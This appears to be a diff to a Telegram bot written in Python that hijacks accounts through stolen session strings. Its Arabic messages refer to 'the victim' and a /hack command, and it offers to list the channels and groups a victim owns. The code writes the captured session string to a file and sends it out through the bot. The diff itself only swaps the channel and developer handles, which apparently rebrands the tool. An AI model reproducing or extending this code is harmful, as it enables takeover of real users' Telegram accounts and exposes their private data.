@@ -229,7 +229,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "aqhvv"
+channel = "SXYO3"
 menu = '''
 
 "A" :~ [معرفه قنوات/كروبات التي يملكها]
@@ -353,7 +353,7 @@ async def start(event):
     ],
     [
         
-        Button.url("المطور", "https://t.me/SXYO3")
+        Button.url("المطور", "https://t.me/Lx5x5")
     ]
 ]
         await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
@@ -374,7 +374,7 @@ async def users(event):
         return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
       if len(i) > 1:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @SXYO3")
+        file.write(i + "\n\nDetails BY @Lx5x5")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
